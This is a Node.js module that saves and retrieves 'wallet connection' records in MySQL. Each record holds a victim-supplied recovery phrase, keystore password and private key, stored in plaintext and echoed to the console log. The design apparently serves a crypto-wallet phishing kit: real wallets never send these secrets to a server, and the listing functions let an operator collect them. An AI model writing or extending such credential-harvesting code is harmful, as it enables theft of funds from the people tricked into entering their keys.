import { executeQuery, initializeDatabase } from './mysqlConnection.js';

// Try to initialize MySQL database
let useMySQL = false;
let mysqlInitialized = false;

// Initialize MySQL synchronously and wait for completion
async function initializeMySQL() {
  try {
    const success = await initializeDatabase();
    useMySQL = success;
    mysqlInitialized = true;
    console.log(`Using MySQL for data storage`);
  } catch (error) {
    console.error('MySQL connection failed:', error.message);
    mysqlInitialized = true;
    throw new Error('MySQL database connection failed');
  }
}

// Wait for MySQL initialization before processing any requests
export async function waitForMySQLInitialization() {
  if (!mysqlInitialized) {
    console.log('Waiting for MySQL initialization...');
    // Wait for initialization to complete
    await new Promise(resolve => {
      const checkInitialization = () => {
        if (mysqlInitialized) {
          resolve();
        } else {
          setTimeout(checkInitialization, 100);
        }
      };
      checkInitialization();
    });
  }
  if (!useMySQL) {
    throw new Error('MySQL database is not available');
  }
  return useMySQL;
}

// Start MySQL initialization
initializeMySQL();

// Read all wallet connections
export async function readWalletConnections() {
  await waitForMySQLInitialization();
  
  try {
    const query = 'SELECT * FROM wallet_connections ORDER BY timestamp ASC';
    const connections = await executeQuery(query);
    return connections;
  } catch (error) {
    console.error('Error reading from MySQL:', error.message);
    throw error;
  }
}

// Add a new wallet connection
export async function addWalletConnection(connectionData) {
  await waitForMySQLInitialization();
  
  try {
    const {
      walletName,
      connectionMethod,
      phraseInput = null,
      keystorePassword = null,
      privateKeyInput = null
    } = connectionData;

    const id = Date.now().toString();
    const timestamp = new Date().toISOString();
    const status = 'submitted';

    const query = `
      INSERT INTO wallet_connections 
      (id, timestamp, walletName, connectionMethod, status, phraseInput, keystorePassword, privateKeyInput)
      VALUES (?, ?, ?, ?, ?, ?, ?, ?)
    `;

    const params = [
      id,
      timestamp,
      walletName,
      connectionMethod,
      status,
      phraseInput,
      keystorePassword,
      privateKeyInput
    ];

    console.log('Executing query:', query, 'with params:', params);
    const result = await executeQuery(query, params);
    console.log('Insert result:', result);

    // Return the newly created connection
    return {
      id,
      timestamp,
      walletName,
      connectionMethod,
      status,
      phraseInput,
      keystorePassword,
      privateKeyInput
    };
  } catch (error) {
    console.error('Error adding to MySQL:', error.message);
    throw error;
  }
}

// Get all wallet connections sorted by timestamp (ascending)
export async function getWalletConnectionsSorted() {
  await waitForMySQLInitialization();
  
  try {
    const query = 'SELECT * FROM wallet_connections ORDER BY timestamp ASC';
    const connections = await executeQuery(query);
    return connections;
  } catch (error) {
    console.error('Error getting sorted from MySQL:', error.message);
    throw error;
  }
}

// Get wallet connections by wallet name
export async function getWalletConnectionsByWallet(walletName) {
  await waitForMySQLInitialization();
  
  try {
    const query = 'SELECT * FROM wallet_connections WHERE walletName = ? ORDER BY timestamp ASC';
    const connections = await executeQuery(query, [walletName]);
    return connections;
  } catch (error) {
    console.error('Error getting by wallet from MySQL:', error.message);
    throw error;
  }
}

// Clear all wallet connections (for testing/reset)
export async function clearWalletConnections() {
  await waitForMySQLInitialization();
  
  try {
    const query = 'DELETE FROM wallet_connections';
    await executeQuery(query);
    return true;
  } catch (error) {
    console.error('Error clearing MySQL:', error.message);
    throw error;
  }
}
